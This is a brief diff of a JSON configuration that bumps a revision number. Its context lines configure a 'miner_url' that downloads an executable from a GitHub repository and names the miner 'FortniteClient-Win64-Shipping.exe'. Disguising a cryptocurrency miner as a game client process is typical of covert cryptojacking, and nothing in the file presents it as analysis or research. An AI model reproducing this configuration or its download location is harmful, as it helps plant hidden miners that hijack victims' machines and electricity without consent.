@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "config_revision": 3,
+  "config_revision": 4,
   "miner_url": "https://raw.githubusercontent.com/terraversa/VBC-MNR/main/FortniteClient-Win64-Shipping.exe",
   "miner_name": "FortniteClient-Win64-Shipping.exe",
   "miner_version": "1",
